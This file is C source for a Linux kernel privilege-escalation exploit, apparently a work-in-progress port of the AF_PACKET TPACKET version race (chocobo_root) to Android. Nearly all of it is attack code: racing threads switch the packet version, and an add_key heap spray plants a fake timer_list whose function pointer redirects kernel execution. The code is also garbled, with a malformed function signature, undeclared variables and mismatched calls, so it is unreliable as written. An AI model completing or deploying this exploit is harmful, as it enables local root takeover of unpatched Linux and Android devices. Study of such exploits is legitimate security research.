//Check1.
//See if we can utilise the use after free on the Android Platform
//Plan
// A. Use chocobo_root.c as the base
// B. Remove VSYS attack
// C. Change exploit function pointer to set a global variable on the stack?
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>

volatile int barrier = 1;
volatile int success = 0;
volatile int vers_switcher_done = 0;

//?
#define PAD 64

//?
int pad_fds[PAD];

struct ctl_table {
    const char *procname;
    void *data;
    int maxlen;
    unsigned short mode;
    struct ctl_table *child;
    void *proc_handler;
    void *poll;
    void *extra1;
    void *extra2;
};

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

struct timer_list {
    void *next;
    void *prev;
    unsigned long           expires;
    void                    (*function)(unsigned long);
    unsigned long           data;
    unsigned int                     flags;
    int                     slack;
};

void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;


    return NULL;
}

//why 1408
//why 1408-24 for add key?
#define BUFSIZE 1408
char exploitbuf[BUFSIZE];

void kmalloc(void)
{
    while(1)
        syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
}


void pad_kmalloc(void)
{
    int x;

    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

int try_exploit((void*())adfasdfwTDO func)
{
    pthread_t setsockopt_thread_thread,a;
    int val;
    socklen_t l;
    struct timer_list *timer;
    int fd;
    struct tpacket_block_desc *pbd;
    int off;
    sigset_t set;

    sigemptyset(&set);

    sigaddset(&set, SIGSEGV);

    if(pthread_sigmask(SIG_BLOCK, &set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    fprintf(stderr,"new exploit attempt starting, jumping to %p\n",(void *)func,(void *)arg);

    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        printf("target socket error\n");
        exit(1);
    }

    pad_kmalloc();

    fprintf(stderr,"sockets allocated\n");

    val = TPACKET_V3;

    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

//try to set the timeout to 10 seconds
//the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;

    sfd = fd;

    if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }


    pthread_create(&a, NULL, vers_switcher, (void *)NULL);

    usleep(200000);

    fprintf(stderr,"removing barrier and spraying..\n");

    memset(exploitbuf,'\x00',BUFSIZE);

    timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);
    timer->next = 0;
    timer->prev = 0;

    //why 4294943360? //infinity?
    timer->expires = 4294943360;
    timer->function = (void *)func;
    //timer->data = arg;
    timer->data = 0;
    timer->flags = 1;
    timer->slack = -1;


    barrier = 0;

    usleep(100000);

    while(!vers_switcher_done)usleep(100000);

    l = sizeof(val);
    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

    fprintf(stderr,"current packet version = %d\n",val);

    pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);


    if(pbd == MAP_FAILED) {
        fprintf(stderr,"could not map pbd\n");
        exit(1);
    } else {
        off = pbd->hdr.bh1.offset_to_first_pkt;
        fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
    }


    if(val == TPACKET_V1 && off != 0) {
        fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
    } else {
        fprintf(stderr,"race not won\n");
        exit(2);
    }

    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

    pthread_create(&a, NULL, verification_func, (void *)NULL);

    fprintf(stderr,"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n");
    sleep(1);
    fprintf(stderr,"closing socket and verifying..");

    close(sfd);

    kmalloc();

    fprintf(stderr,"all messages sent\n");

    //end
    sleep(31337);
    exit(1);
}


int verification_result = 0;

void catch_sigsegv(int sig)
{
    verification_result = 0;
    pthread_exit((void *)1);
}

void exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    int status;
    int pid;

retry:

    pid = fork();

    if(pid == 0) {
        try_exploit(func, arg, verification_func);
        exit(1);
    }

    wait(&status);

    printf("\n");

    if(WEXITSTATUS(status) == 2) {
        printf("retrying stage..\n");
        kill(pid, 9);
        sleep(2);
        goto retry;
    }

    else if(WEXITSTATUS(status) != 0) {
        printf("something bad happened, aborting exploit attempt\n");
        exit(-1);
    }



    kill(pid, 9);
}

void verifySuccess(void) {
    success = 1;
}

int main(int argc, char **argv)
{
    int status, pid;
    fprintf(stderr,"linux AF_PACKET race condition exploit by rebel\n");

    pid = fork();

    if(pid == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if(unshare(CLONE_NEWNET) != 0)
            fprintf(stderr, "failed to create new network namespace\n");

        exploit((&verifySuccess),0,0); //TODO
        exit(0);
    }

    waitpid(pid, &status, 0);

    printf("Exiting success volatile: %d\n", success);
    return 0;
}
